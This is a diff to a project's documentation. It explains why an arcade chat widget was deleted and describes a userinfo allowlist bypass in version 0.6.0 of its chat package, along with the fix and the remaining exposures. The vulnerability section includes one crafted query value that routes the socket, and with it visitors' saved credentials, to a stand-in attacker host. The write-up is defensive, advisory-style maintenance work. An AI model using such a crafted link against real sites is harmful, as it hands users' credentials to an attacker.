@@ -4,13 +4,102 @@
 
 ### RETIRED from the arcade, 2026-10-12. The server still runs.
 
-**No page in this repository loads the widget any more**, so
-`shared/adenosine-chat.js`, `shared/chat-worker.js` and `shared/chat-widget.css`
-are unreferenced and `chat-server.py` on 8768 has no clients. Everything below
-describes how it worked and is kept because the server is still deployed and the
-reasoning is still worth having; read it as history, not as the current state.
-Confirm with `grep -rl adenosine-chat.js --include=*.html .` before believing
-either way.
+**No page in this repository loads the widget any more**, and as of 2026-10-12
+the four files it ran on are **deleted**, not merely unreferenced:
+`shared/adenosine-chat.js`, `shared/chat-worker.js`, `shared/chat-widget.css`
+and the hand-written `shared/chat-server.js`. `chat-server.py` on 8768 has no
+clients. Everything below describes how it worked and is kept because the
+server is still deployed and the reasoning is still worth having; read it as
+history, not as the current state.
+
+#### Why they were deleted rather than left dormant
+
+Because dormant was not what they were. The retirement was judged safe on the
+grounds that no page loads the widget, which was true of the pages that already
+existed and false of the ones `scripts/scaffold-game.mjs` makes: it went on
+emitting `chat-widget.css`, `adenosine-chat.js`, `chat-server.js` and a
+`ChatWidget.connect(MC_CHAT_OPTS)` call into every new game page. So the next
+`scaffold-game` run would have made the widget live again, and the check that
+was supposed to notice could not, because a page that does not exist yet loads
+nothing.
+
+That mattered because the vendored bundle was built from
+`@magmacrunch/adenosine-chat` **0.6.0**, which carries the userinfo allowlist
+bypass. `hostOf()` read the host by stripping the scheme and then splitting on
+`/` and `:`, which returns the text in front of the first colon. For a value
+carrying userinfo that text is the credentials and not the host, so
+
+```
+?server=<allowlisted-host>:443@evil.example.com
+```
+
+matched the allowlist on a name the socket was never going to open, and the
+socket went to `evil.example.com`. The page's own hostname is always permitted,
+so naming it in front of the `@` was enough on its own and no deployment had to
+be misconfigured. What that cost is the whole point of having an allowlist, and
+it is the sentence further down this page: the widget replays the visitor's
+saved credentials as soon as its socket opens, so a crafted link handed them to
+a host of the sender's choosing. HIGH severity, and it was two paths away from
+live rather than one.
+
+adenosine `0a9f39c` fixes it by reading the hostname off the `URL` parser, the
+parser the `WebSocket` constructor itself uses, released as **0.6.1**. That was
+**not on npm** when this was written, so `node_modules` held only the
+vulnerable build and a plain `npm run build:adenosine` would have copied it
+back over any fixed file put there by hand.
+
+Three things were therefore done together, and the third is the one worth
+remembering:
+
+- the four files deleted, and `.gitattributes` and
+  `scripts/generate-theme-audit.mjs` stopped naming two of them;
+- the chat block removed from `scaffold-game.mjs`;
+- **`chat` de-registered from `scripts/sync-adenosine.mjs`** -- out of
+  `PACKAGES`, `EXTRA_ASSETS` and `PACKAGE_CSS`, and `chat-server.js` out of
+  `LOCAL_SHARED`. Without this last one the deletion undoes itself: the next
+  sync for some unrelated package copies 0.6.0 straight back out of
+  `node_modules`.
+
+`arcade/tests/test-chat-retired.js` holds all three. It asserts the files are
+absent, that no page in the repository loads them, that the scaffolder generates
+none of them (by running it against a throwaway root and reading the real
+output), and that the sync script does not list `chat`. Each of its sweeps
+asserts it found a corpus before concluding anything from it, so it cannot pass
+by finding nothing.
+
+#### Three live references were left alone on purpose
+
+None of them can load anything, and each costs more to remove than it costs to
+keep:
+
+- **`nav.js` still does `getElementById('arcadeChatWidget')`** and hides it on
+  non-arcade pages. The element never exists now, so the guard is inert. It was
+  removed and then put back, because **any** edit to `nav.js` changes its
+  content hash and restales the `nav.js?v=` stamp on about 110 pages, which
+  `npm run check` then fails until every one is rewritten. A whole-site restamp
+  is not worth deleting an inert null check, and it would collide with every
+  other session editing a page. Fold it into the next change that has to touch
+  `nav.js` anyway.
+- **`arcade/makemecookies/css/layout.css` styles `#arcadeChatWidget`** in its
+  landscape block, and reserves the corner with
+  `.touchpad, .controls { padding-left: 64px; }`. The selector is dead; the
+  padding is now 64px of landscape phone reserved for nothing. Removing it is a
+  layout change to a game rather than cleanup, so it wants somebody looking at
+  the result on a phone.
+- **`.eslintrc.json` keeps `AdChat`** while dropping `ChatWidget`.
+  `ware/adenosine/` genuinely still uses `AdChat`, see below.
+
+#### What is NOT covered, and still points at 0.6.0
+
+`ware/adenosine/` is the package showcase and loads its copies from jsDelivr
+rather than from `arcade/shared/`. Both `ware/adenosine/playground.js` and
+`ware/adenosine/theme.js` pin `chat` at **0.6.0**, and
+`ware/adenosine/examples/chat-widget.js` mounts the widget when a visitor picks
+the chat package. That page is same-origin with the arcade, so chat credentials
+saved in `localStorage` while the widget was live are still reachable from it.
+The pins cannot simply be raised: 0.6.1 is not published, so pointing jsDelivr
+at it would 404 and take the playground down. Raise them in the same change
+that publishes 0.6.1.
 
 Why it went, since the reasons are the useful part:
 
@@ -33,9 +122,15 @@ Two consequences worth knowing:
   starts it and the health bot TCP-probes it every half hour and alerts when it
   is down. That is now an alert path for a service with no clients. Moving it to
   `dashboard_only`, or retiring the unit, is a decision nobody has taken.
-- **`arcade/index.html` still loads `shared/chat-server.js`** and no widget. Its
-  `MC_CHAT_OPTS` is what the MULTIPLAYER ONLINE probe dials, so the status dot on
-  the arcade index depends on 8768 answering. Retiring the unit breaks that dot.
+- **The arcade index no longer depends on 8768, and this bullet used to say it
+  did.** It read "`arcade/index.html` still loads `shared/chat-server.js` and no
+  widget", so retiring the unit would break the MULTIPLAYER ONLINE dot. That was
+  true when it was written and false by the time `chat-server.js` was deleted:
+  the page loads `shared/mp-server.js` now and the dot probes the host a game
+  actually dials, via `mpServerFor()`, which is also the right question for a dot
+  with that label. So **nothing in this repository reads 8768 any more**, and
+  moving `arcade-chat` to `dashboard_only` or retiring the unit costs the dot
+  nothing. Still a decision nobody has taken, but no longer one with a hostage.
 
 - **backgammon, checkers and chinese-checkers now have no chat at all.** They
   never had working match chat to lose: no chat UI in the page and a receive
@@ -80,6 +175,12 @@ Page (browser) ──postMessage──▶ SharedWorker ──WebSocket──▶ 
 
 ### Adding chat to a game page
 
+**This no longer works, and pasting it is the mistake this page exists to
+prevent.** All four files are deleted and `chat` is de-registered from
+`sync-adenosine.mjs`, so these tags 404 and `npm run build:adenosine` will not
+bring them back. `arcade/tests/test-chat-retired.js` fails if they appear in a
+page. Kept for the shape of it:
+
 ```html
 <link rel="stylesheet" href="../shared/chat-widget.css">
 <script src="../shared/adenosine-chat.js"></script>
@@ -87,7 +188,23 @@ Page (browser) ──postMessage──▶ SharedWorker ──WebSocket──▶ 
 <script>AdChat.ChatWidget.connect(MC_CHAT_OPTS);</script>
 ```
 
-`npm run build:adenosine` stamps the `?v=` cache-busting hashes on those tags.
+`npm run build:adenosine` used to stamp the `?v=` cache-busting hashes on those
+tags.
+
+**For match chat inside a game, which is what this is nearly always wanted
+for, do not use any of it.** Chat belongs to the game's own server, which takes
+the room from the connection and so cannot leak across matches. Copy cribbage:
+a panel, `sendChat`, and `MP.onChatMessage`.
+
+**To genuinely revive the floating widget** needs, in order:
+`@magmacrunch/adenosine-chat` 0.6.1 or newer published and installed (0.6.0
+carries the userinfo bypass above); `chat` added back to `PACKAGES`,
+`EXTRA_ASSETS` and `PACKAGE_CSS`, and `chat-server.js` to `LOCAL_SHARED`, in
+`sync-adenosine.mjs`; `chat-server.js` recovered from history rather than
+rewritten, because its `allowlist` is the security control and a fresh shim is
+where that gets left out; and `test-chat-retired.js` replaced by something
+shaped like `test-multiplayer-host.js`, which holds a served bundle to the
+userinfo cases rather than asserting its absence.
 
 ### Public API
 
